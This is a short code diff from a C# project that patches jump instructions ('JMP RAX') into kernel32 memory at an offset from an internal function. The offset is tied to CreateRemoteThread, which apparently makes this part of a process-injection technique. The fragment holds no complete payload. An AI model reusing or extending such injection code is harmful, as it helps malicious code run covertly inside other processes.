@@ -64,7 +64,7 @@ namespace WindowsForms
             byte[] Patch = {0xFF, 0xE0, 0xCC, 0xCC, 0xCC};    //JMP RAX
             byte[] Patch2 = {0x48, 0xFF, 0xC0, 0xFF, 0xE0};   //INC RAX, JMP RAX
 
-            var CreateRemoteThreadPatchOffset = (long) GetProcAddress(GetModuleHandle("kernel32.dll"), "BaseDumpAppcompatCacheWorker") + 0x1E0;
+            var CreateRemoteThreadPatchOffset = (long)GetProcAddress(GetModuleHandle("kernel32.dll"), "BaseDumpAppcompatCacheWorker") + 0x250;  //0x1E0;
 
             if (status)
                 Patch = Patch2;
